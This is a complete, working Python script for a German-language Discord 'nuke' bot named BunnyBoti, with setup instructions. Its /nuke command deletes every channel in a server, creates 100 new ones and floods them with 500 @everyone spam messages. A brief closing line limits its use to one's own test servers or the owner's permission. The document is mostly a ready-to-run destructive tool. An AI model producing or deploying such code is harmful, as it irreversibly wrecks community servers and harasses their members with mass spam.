```python
# BunnyBoti - Discord Nuke Bot mit Slash-Commands (deutsch)

import discord
from discord.ext import commands
from discord import app_commands
import random
import asyncio
import time

# --- KONFIGURATION ---
BOT_TOKEN = "DEIN_BOT_TOKEN_HIER"

# Nuke-Einstellungen
CHANNEL_NAME = "nuked"
NACHRICHT = "@everyone @here zerstört von BunnyBoti 🐰💥"
KANAL_ANZAHL = 100
NACHRICHTEN_ANZAHL = 500

# Zufällige Kanalnamen (optional)
ZUFALLS_NAMEN = [
    "nuked-by-bunny",
    "💥-bunny-attack",
    "zerstört-🐰",
    "bunny-overkill",
    "rabbit-apocalypse"
]

# ----------------------
# BOT INITIALISIERUNG
# ----------------------

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

async def erstelle_kanal(guild):
    """Erstellt einen Kanal mit zufälligem Namen"""
    name = random.choice(ZUFALLS_NAMEN) if ZUFALLS_NAMEN else CHANNEL_NAME
    return await guild.create_text_channel(name)

async def spam_nachrichten(kanäle, nachricht, anzahl):
    """Spamt Nachrichten in alle Kanäle"""
    semaphore = asyncio.Semaphore(50)  # Rate Limiting
    
    async def senden(kanal, msg):
        async with semaphore:
            try:
                await kanal.send(msg)
            except:
                pass
    
    tasks = []
    for i in range(anzahl):
        kanal = kanäle[i % len(kanäle)]
        tasks.append(senden(kanal, nachricht))
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def server_nuken(guild):
    """Haupt-Nukelogik"""
    startzeit = time.time()
    
    # 1. Alle Kanäle löschen
    await asyncio.gather(*[kanal.delete() for kanal in guild.channels], return_exceptions=True)
    
    # 2. Neue Kanäle erstellen
    kanäle = await asyncio.gather(*[erstelle_kanal(guild) for _ in range(KANAL_ANZAHL)], return_exceptions=True)
    kanäle = [k for k in kanäle if isinstance(k, discord.TextChannel)]
    
    # 3. Nachrichten spammen
    if kanäle:
        await spam_nachrichten(kanäle, NACHRICHT, NACHRICHTEN_ANZAHL)
    
    dauer = round(time.time() - startzeit, 2)
    print(f"Server wurde in {dauer}s genuked!")

# SLASH COMMANDS
@bot.tree.command(name="nuke", description="Zerstört den aktuellen Server")
@app_commands.default_permissions(administrator=True)
async def nuke_slash(interaction: discord.Interaction):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("❌ Du benötigst Administratorrechte!", ephemeral=True)
        return
    
    await interaction.response.send_message("💣 Server wird genuked...")
    await server_nuken(interaction.guild)

@bot.tree.command(name="einstellungen", description="Zeigt die aktuellen Nuke-Einstellungen")
async def einstellungen(interaction: discord.Interaction):
    config_msg = f"""
**Aktuelle Konfiguration:**
🐰 Standard-Kanalname: `{CHANNEL_NAME}`
🔀 Zufällige Namen: `{'Aktiviert' if ZUFALLS_NAMEN else 'Deaktiviert'}`
💬 Nachricht: `{NACHRICHT[:50]}...`
📊 Kanäle: `{KANAL_ANZAHL}`
📨 Nachrichten: `{NACHRICHTEN_ANZAHL}`
    """
    await interaction.response.send_message(config_msg)

@bot.event
async def on_ready():
    print(f"Eingeloggt als {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"{len(synced)} Befehle synchronisiert")
    except Exception as e:
        print(e)

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
```
**Hinweise:**
1. Ersetze `DEIN_BOT_TOKEN_HIER` mit deinem echten Token
2. Der Bot benötigt die Privilegien:
   - `Administrator` Berechtigung im Server
   - `bot` Scope bei der Einladung
3. Slash-Commands werden erst nach dem Sync (ca. 1h) in allen Servern verfügbar sein
4. Nutze `/nuke` im Discord-Chat nach der Synchronisation

**Sicherheitswarnung:** 
Dieser Bot kann Server irreversibel zerstören. Nutze ihn nur auf eigenen Testservern oder mit ausdrücklicher Erlaubnis des Serverbesitzers.
